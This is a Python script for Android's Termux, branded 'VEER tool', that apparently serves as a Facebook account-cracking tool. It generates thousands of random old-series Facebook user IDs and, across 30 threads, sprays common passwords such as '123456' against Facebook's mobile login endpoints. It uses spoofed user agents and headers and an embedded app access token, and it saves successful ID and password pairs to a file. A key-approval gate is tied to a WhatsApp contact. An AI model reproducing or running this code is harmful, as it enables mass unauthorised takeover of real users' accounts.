#GIFTBY ARNOLD XD- FOR YOU 🫵
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timezone, timedelta

# --- HELPER FUNCTIONS ---

def get_pkt_now():
    """
    Returns current datetime strictly in Pakistan Standard Time (UTC+5).
    """
    pkt_tz = timezone(timedelta(hours=5))
    return datetime.now(pkt_tz)

def speak(text):
    """
    Female Voice TTS engine using termux-tts-speak or espeak.
    """
    try:
        os.system(f'termux-tts-speak -p 1.5 -r 1.0 "{text}" > /dev/null 2>&1 || espeak -v en-us+f3 "{text}" > /dev/null 2>&1')
    except Exception:
        pass

def get_greeting():
    """
    Determines greeting based on the current PKT hour accurately.
    04:00 AM to 11:59 AM -> Good Morning
    12:00 PM to 04:59 PM -> Good Afternoon
    05:00 PM to 03:59 AM -> Good Evening / Night
    """
    hour = get_pkt_now().hour
    if 4 <= hour < 12:
        return "Good Morning"
    elif 12 <= hour < 17:
        return "Good Afternoon"
    else:
        return "Good Evening"

def show_loading(message="LOADING SYSTEM"):
    """
    Displays dynamic opening step-by-step loading (10%, 20%, 30%... 100%) with Voice Speak.
    """
    speak(message)
    animation = [
        "█▒▒▒▒▒▒▒▒▒", "██▒▒▒▒▒▒▒▒", "███▒▒▒▒▒▒▒", "████▒▒▒▒▒▒", "█████▒▒▒▒▒",
        "██████▒▒▒▒", "███████▒▒▒", "████████▒▒", "█████████▒", "██████████"
    ]
    for i in range(10):
        percent = (i + 1) * 10
        sys.stdout.write(f"\r\x1b[38;5;51m[{message}] \x1b[38;5;46m{animation[i]} {percent}%\x1b[0m")
        sys.stdout.flush()
        time.sleep(0.15)
    print()

def get_current_datetime():
    """
    Returns current formatted PKT date and time.
    """
    return get_pkt_now().strftime("%Y-%m-%d | %I:%M:%S %p PKT")

# --- INITIAL OPENING LOADING ---

os.system('clear')

# Real-time Greeting Check (Pakistan Time)
greeting_msg = get_greeting()
print(f'\n\x1b[38;5;46m  >>> {greeting_msg.upper()}! INITIALIZING VEER TOOL...\x1b[0m\n')
speak(f"{greeting_msg}! Initializing Veer Tool")
time.sleep(1)

# Opening Loading Animation (10% - 100%)
show_loading("STARTING VEER TOOL ENGINE")

# --- APPROVAL SYSTEM (FIXED KEY GENERATOR) ---

def approval():
    os.system('clear')
    
    # Dynamic greeting in approval process
    current_greet = get_greeting()
    show_loading(f"CHECKING APPROVAL - {current_greet.upper()}")

    # Har device ke liye unique key generate karne ka fixed code
    try:
        b1 = subprocess.check_output('getprop ro.product.model', shell=True).decode().strip()
        b2 = subprocess.check_output('getprop ro.build.id', shell=True).decode().strip()
        b3 = subprocess.check_output('getprop ro.build.display.id', shell=True).decode().strip()
        raw_device = f"{b1}-{b2}-{b3}"
    except Exception:
        raw_device = "FALLBACK-DEVICE"

    try:
        user_id = str(os.getuid())
    except Exception:
        user_id = "0000"

    raw_key = f"VEER-{raw_device}-{user_id}"
    key = hashlib.md5(raw_key.encode('utf-8')).hexdigest()[:12].upper()
    user_key = f"VEER-KEY-{key}"

    # GitHub Raw Link for Approved Keys
    approval_url = "https://raw.githubusercontent.com/mashooq786/-/refs/heads/main/Approved.txt"

    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(" \033[38;5;46m      ★ SYSTEM APPROVAL REQUIRED ★")
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
    print(f" \x1b[38;5;46mYOUR KEY : \x1b[1;37m{user_key}")
    print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

    try:
        approved_keys = requests.get(approval_url).text
    except Exception:
        print(" \x1b[38;5;196m[!] Internet connection error or approval server down!")
        speak("Connection Error, Check Your Internet")
        sys.exit()

    if user_key in approved_keys:
        print(f" \x1b[38;5;46m[✓] APPROVAL SUCCESSFUL! {current_greet.upper()} BOSS!")
        speak(f"Approval Successful, {current_greet} Boss")
        time.sleep(1.5)
    else:
        print(" \x1b[38;5;196m[×] YOUR KEY IS NOT APPROVED YET!")
        print(" \x1b[38;5;220m[!] Copy key and send on WhatsApp for Approval.")
        speak("Your Key is Not Approved, Please Contact Admin")
        
        # Key clipboard par copy ho jayegi (Termux)
        os.system(f'echo "{user_key}" | termux-clipboard-set > /dev/null 2>&1')
        print(" \x1b[38;5;51m[+] Key copied to clipboard automatically!")
        speak("Key Copied to Clipboard")
        
        input("\n \x1b[38;5;46mPress Enter to contact Admin on WhatsApp...")
        speak("Redirecting to WhatsApp")
        os.system(f'xdg-open "https://wa.me/923337398893?text=Hello%20Admin,%20Please%20Approve%20My%20Key:%20{user_key}"')
        sys.exit()

# Run Approval System
approval()

# --- SYSTEM SETUP & MAIN INTERFACE ---

os.system('clear')

# Welcome Screen Display + Voice
current_greet = get_greeting()
print(f"""\033[1;37m
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  \033[38;5;46m   ★ WELCOME TO VEER TOOL - {current_greet.upper()} ★
  \033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m""")

speak(f"{current_greet}, Welcome to Veer Tool")
time.sleep(1)

# Module setup and requirements
modules = ['requests', 'urllib3', 'mechanize', 'rich', 'bs4', 'httpx']
show_loading("CHECKING SYSTEM PACKAGES")

for module in modules:
    try:
        __import__(module)
    except ImportError:
        print(f"\x1b[38;5;220mInstalling missing package: {module}...\x1b[0m")
        speak(f"Installing missing package {module}")
        os.system(f'pip install {module}')

from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

os.system('pip uninstall requests chardet urllib3 idna certifi -y > /dev/null 2>&1')
os.system('pip install chardet urllib3 idna certifi requests httpx beautifulsoup4 > /dev/null 2>&1')

os.system('clear')

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

def windows1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write('\x1b]2;𓆩【 Veer 】𓆪 \x07')

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')

    print(f"""\033[1;37m
██╗   ██╗███████╗███████╗██████╗ 
██║   ██║██╔════╝██╔════╝██╔══██╗
██║   ██║█████╗  █████╗  ██████╔╝
╚██╗ ██╔╝██╔══╝  ██╔══╝  ██╔══██╗
 ╚████╔╝ ███████╗███████╗██║  ██║
  ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m             ⚡ V E E R ⚡
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;37m  DATE & TIME : {get_current_datetime()}
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m""")

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000000', '100000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    print(f'\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m')

def BNG_71_():
    ____banner____()
    speak("Main Menu Option 1: Old Clone Method")
    print(f'\x1b[38;5;46m       ┌──────────────────────────────┐')
    print(f'\x1b[38;5;46m       │  \x1b[1;37m[01]\x1b[38;5;46m  OLD CLONE METHOD           │')
    print(f'\x1b[38;5;46m       └──────────────────────────────┘\x1b[0m')

    linex()

    speak("Please select an option")
    __Jihad__ = input(f"       \x1b[38;5;46m➤ SELECT OPTION {W}: {Y}")

    if __Jihad__ in ('01', '1'):
        speak("Option One Selected: Old Clone Method")
        old_clone()
    else:
        speak("Invalid Choice, Please try again")
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print(f'\x1b[38;5;46m       ┌──────────────────────────────┐')
    print(f'\x1b[38;5;46m       │  \x1b[1;37m[01]\x1b[38;5;46m  BEST SERIES FOR TRADERS    │')
    print(f'\x1b[38;5;46m       └──────────────────────────────┘\x1b[0m')
    linex()

    print(f'\x1b[38;5;46m       ┌──────────────────────────────┐')
    print(f'\x1b[38;5;46m       │  \x1b[1;37m[02]\x1b[38;5;46m  100003/4 SERIES             │')
    print(f'\x1b[38;5;46m       └──────────────────────────────┘\x1b[0m')
    linex()

    print(f'\x1b[38;5;46m       ┌──────────────────────────────┐')
    print(f'\x1b[38;5;46m       │  \x1b[1;37m[03]\x1b[38;5;46m  2009 SERIES                  │')
    print(f'\x1b[38;5;46m       └──────────────────────────────┘\x1b[0m')
    linex()

    speak("Choose a series option")
    _input = input(f"       \x1b[38;5;46m➤ SELECT OPTION {W}: {Y}")

    if _input in ('01', '1'):
        speak("Selected Best Series Option")
        old_One()
    elif _input in ('02', '2'):
        speak("Selected 100003 Series Option")
        old_Tow()
    elif _input in ('03', '3'):
        speak("Selected 2009 Series Option")
        old_Tree()
    else:
        speak("Invalid Option, try again")
        print(f"\n[×]{rad} Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_One():
    user = []
    ____banner____()

    print(f"\x1b[38;5;46m       ┌──────────────────────────────┐")
    print(f"\x1b[38;5;46m       │  \x1b[1;37mOLD CODE : 2010 - 2014       \x1b[38;5;46m│")
    print(f"\x1b[38;5;46m       └──────────────────────────────┘\x1b[0m")

    speak("Enter series code")
    ask = input(f"       \x1b[38;5;46m➤ SELECT CODE {W}: {G}")

    linex()
    ____banner____()

    print(f"\x1b[38;5;46m       ┌──────────────────────────────┐")
    print(f"\x1b[38;5;46m       │  \x1b[1;37mEXAMPLE : 20000 / 30000 / 99999 \x1b[38;5;46m│")
    print(f"\x1b[38;5;46m       └──────────────────────────────┘\x1b[0m")

    speak("Enter cloning limit")
    limit = input(f"       \x1b[38;5;46m➤ ENTER LIMIT {W}: {G}")

    linex()
    star = '10000'

    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)

    print(f"\x1b[38;5;46m       ┌──────────────────────────────┐")
    print(f"\x1b[38;5;46m       │  \x1b[1;37m[01]\x1b[38;5;46m METHOD 1                 │")
    print(f"\x1b[38;5;46m       └──────────────────────────────┘")

    print(f"\x1b[38;5;46m       ┌──────────────────────────────┐")
    print(f"\x1b[38;5;46m       │  \x1b[1;37m[02]\x1b[38;5;46m METHOD 2                 │")
    print(f"\x1b[38;5;46m       └──────────────────────────────┘")

    linex()
    speak("Select login method")
    meth = input(f"       \x1b[38;5;46m➤ CHOOSE METHOD {W}: {Y}").strip().upper()

    show_loading("STARTING PROCESS")
    speak("Starting cracking session now")

    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;46m➤ TOTAL ID : {G}{limit}{W}")
        print(f"       \x1b[38;5;46m➤ STATUS   : {G}RUNNING{W}")
        linex()

        for mal in user:
            uid = star + mal
            if meth in ('1', 'A'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B'):
                pool.submit(login_2, uid)
            else:
                speak("Invalid Method Selected")
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
    speak("Select code")
    ask = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    speak("Enter total ID count")
    limit = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;46m(\x1b[1;37m1\x1b[38;5;46m) METHOD 1')
    print('       \x1b[38;5;46m(\x1b[1;37m2\x1b[38;5;46m) METHOD 2')
    linex()
    speak("Choose method 1 or 2")
    meth = input(f"       \x1b[38;5;46mCHOICE {W}(1/2): {Y}").strip().upper()

    show_loading("STARTING PROCESS")
    speak("Starting process now")

    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;46mTOTAL ID COUNT {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;46mUSE AIRPLANE MODE FOR GOOD RESULTS{G}")
        linex()
        for uid in user:
            if meth in ('1', 'A'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B'):
                pool.submit(login_2, uid)
            else:
                speak("Invalid Method Selected")
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;46m[\x1b[1;37m01\x1b[38;5;46m] OLD UID \x1b[38;5;250m• \x1b[38;5;226m2009-2010")
    speak("Select option")
    ask = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    speak("Enter limit count")
    limit = input(f"       \x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print(f'       \x1b[38;5;46m[ 01 ] \x1b[1;37mOLD METHOD FAST')
    print(f'       \x1b[38;5;46m[ 02 ] \x1b[1;37mOLD METHOD SECURE')
    linex()
    speak("Choose method 1 or 2")
    meth = input(f"       \x1b[38;5;46mCHOICE {W}(1/2): {Y}").strip().upper()

    show_loading("STARTING PROCESS")
    speak("Starting process now")

    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;46mTOTAL ID COUNT {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;46mUSE AIRPLANE MODE FOR GOOD RESULTS{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                speak("Invalid Method Selected")
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\x1b[38;5;46m[\x1b[1;37mVEER\x1b[38;5;46m]\x1b[1;37m \x1b[38;5;51mLOOP\x1b[1;37m:\x1b[38;5;226m {loop} \x1b[1;37m❘ \x1b[38;5;46mOK\x1b[1;37m:\x1b[38;5;82m {len(oks)}\x1b[0m")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/VEER-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                speak(f"Success! OK ID Found: {uid}")
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\x1b[38;5;46m✓ \x1b[1;37mSUCCESS \x1b[38;5;250m• \x1b[38;5;46m{uid} \x1b[38;5;250m• \x1b[38;5;226m{pw} \x1b[38;5;250m• \x1b[38;5;208m{creationyear(uid)}")
                print(f"\x1b[38;5;51m🔗 PROFILE : https://facebook.com/{uid}")
                open('/sdcard/VEER-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                speak(f"Success! OK ID Found: {uid}")
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/veer-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    speak(f"Success! OK ID Found: {uid}")
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/veer-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    speak(f"Success! OK ID Found: {uid}")
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()
